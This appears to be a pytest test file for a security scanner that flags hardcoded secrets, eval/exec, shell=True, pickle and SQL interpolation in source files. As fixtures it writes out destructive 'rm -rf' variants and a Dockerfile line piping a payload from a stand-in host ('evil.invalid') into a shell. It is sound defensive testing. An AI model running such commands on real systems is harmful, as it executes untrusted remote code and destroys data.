"""SYS-09 (security gate): the built-in deterministic scanner."""

from __future__ import annotations

from pathlib import Path

import pytest

from pmpe.quality.security_scan import scan_file, scan_tree

CLEAN = """\
import hmac
import os


def check(token: str) -> bool:
    expected = os.environ.get("APP_TOKEN", "")
    return bool(expected) and hmac.compare_digest(token, expected)
"""


def test_clean_code_has_no_findings(tmp_path: Path) -> None:
    p = tmp_path / "auth.py"
    p.write_text(CLEAN)
    assert scan_file(p) == []


def test_hardcoded_secret_is_found(tmp_path: Path) -> None:
    p = tmp_path / "bad.py"
    p.write_text('PASSWORD = "hunter2"\nAPI_KEY = "sk-live-123456"\n')
    findings = scan_file(p)
    assert any(f.rule == "SEC_HARDCODED_SECRET" for f in findings)
    assert all(f.blocking for f in findings)


def test_eval_and_exec_are_found(tmp_path: Path) -> None:
    p = tmp_path / "bad.py"
    p.write_text('data = eval(user_input)\nexec("print(1)")\n')
    rules = {f.rule for f in scan_file(p)}
    assert "SEC_EVAL" in rules


def test_shell_true_is_found(tmp_path: Path) -> None:
    p = tmp_path / "bad.py"
    p.write_text("import subprocess\nsubprocess.run(cmd, shell=True)\n")
    assert any(f.rule == "SEC_SHELL_TRUE" for f in scan_file(p))


def test_pickle_load_is_found(tmp_path: Path) -> None:
    p = tmp_path / "bad.py"
    p.write_text("import pickle\nobj = pickle.loads(blob)\n")
    assert any(f.rule == "SEC_PICKLE" for f in scan_file(p))


def test_sql_string_interpolation_is_found(tmp_path: Path) -> None:
    p = tmp_path / "bad.py"
    p.write_text('cur.execute(f"SELECT * FROM tasks WHERE id = {task_id}")\n')
    assert any(f.rule == "SEC_SQL_FORMAT" for f in scan_file(p))


def test_scan_tree_walks_executable_source_files_only(tmp_path: Path) -> None:
    (tmp_path / "ok.py").write_text(CLEAN)
    (tmp_path / "bad.py").write_text("x = eval(y)\n")
    (tmp_path / "notes.md").write_text("eval( in prose is fine\n")
    findings = scan_tree(tmp_path)
    assert {f.file for f in findings} == {str(tmp_path / "bad.py")}


@pytest.mark.parametrize(
    "options",
    (
        "-rf",
        "-fr",
        "-Rf",
        "-r -f",
        "-f -r",
        "--recursive --force",
        "--force --recursive",
        "-r \\\n-f",
    ),
)
def test_scan_tree_rejects_destructive_deployment_shell(tmp_path: Path, options: str) -> None:
    deploy = tmp_path / "deploy"
    deploy.mkdir()
    script = deploy / "run.sh"
    script.write_text(f"#!/bin/sh\nrm {options} /tmp/application-data\n")
    findings = scan_tree(tmp_path)
    assert any(
        finding.rule == "SEC_SHELL_RECURSIVE_DELETE" and finding.file == str(script)
        for finding in findings
    )


@pytest.mark.parametrize(
    "shell",
    (
        "sh",
        "/bin/sh",
        "/usr/bin/bash",
        "/usr/bin/env bash",
        "env -i bash",
        "env -i CLEAN=1 /bin/sh",
        "env -u HOME bash",
        "env --unset HOME /bin/sh",
        "env -C /tmp bash",
        "env --chdir=/tmp /bin/sh",
    ),
)
def test_scan_tree_rejects_remote_pipe_in_dockerfile(tmp_path: Path, shell: str) -> None:
    deploy = tmp_path / "deploy"
    deploy.mkdir()
    dockerfile = deploy / "Dockerfile"
    dockerfile.write_text(f"FROM python:3.11\nRUN curl https://evil.invalid/payload | {shell}\n")
    findings = scan_tree(tmp_path)
    assert any(
        finding.rule == "SEC_SHELL_REMOTE_PIPE" and finding.file == str(dockerfile)
        for finding in findings
    )


@pytest.mark.parametrize("command", ("rm -f build-reports", "rm -r build-files"))
def test_scan_tree_allows_non_combined_rm_cleanup(tmp_path: Path, command: str) -> None:
    script = tmp_path / "cleanup.sh"
    script.write_text(f"#!/bin/sh\n{command}\n")
    assert not any(finding.rule == "SEC_SHELL_RECURSIVE_DELETE" for finding in scan_tree(tmp_path))


def test_scan_tree_scopes_remote_source_to_current_pipeline(tmp_path: Path) -> None:
    dockerfile = tmp_path / "Dockerfile"
    dockerfile.write_text(
        "FROM python:3.11\n"
        "RUN curl -o archive https://example.invalid/archive && verify archive; "
        "cat verified-installer.sh | sh\n"
    )
    assert not any(finding.rule == "SEC_SHELL_REMOTE_PIPE" for finding in scan_tree(tmp_path))


def test_findings_carry_file_and_line(tmp_path: Path) -> None:
    p = tmp_path / "bad.py"
    p.write_text("a = 1\nb = eval(x)\n")
    (finding,) = scan_file(p)
    assert finding.file == str(p)
    assert finding.line == 2


def test_exec_alone_is_found(tmp_path: Path) -> None:
    """SEC_EXEC must fire on its own — not ride along on an eval() in the same file."""
    p = tmp_path / "bad_exec.py"
    p.write_text('exec("print(1)")\n')
    assert any(f.rule == "SEC_EXEC" for f in scan_file(p))


def test_secret_exemption_is_workspace_relative(tmp_path: Path) -> None:
    """Only the WORKSPACE's tests/ tree is exempt from the secrets rule. Product
    code must stay flagged even when the workspace itself sits under an absolute
    ancestor named 'tests' (e.g. a runs dir inside a tests directory)."""
    root = tmp_path / "tests" / "run-workspace"
    (root / "app").mkdir(parents=True)
    (root / "tests").mkdir()
    (root / "app" / "config.py").write_text('password = "hunter2"\n')
    (root / "tests" / "helper.py").write_text('password = "hunter2"\n')

    secret_files = {f.file for f in scan_tree(root) if f.rule == "SEC_HARDCODED_SECRET"}
    assert any(f.endswith("app/config.py") for f in secret_files), "product code must be flagged"
    assert not any("helper.py" in f for f in secret_files), "workspace tests/ files are exempt"
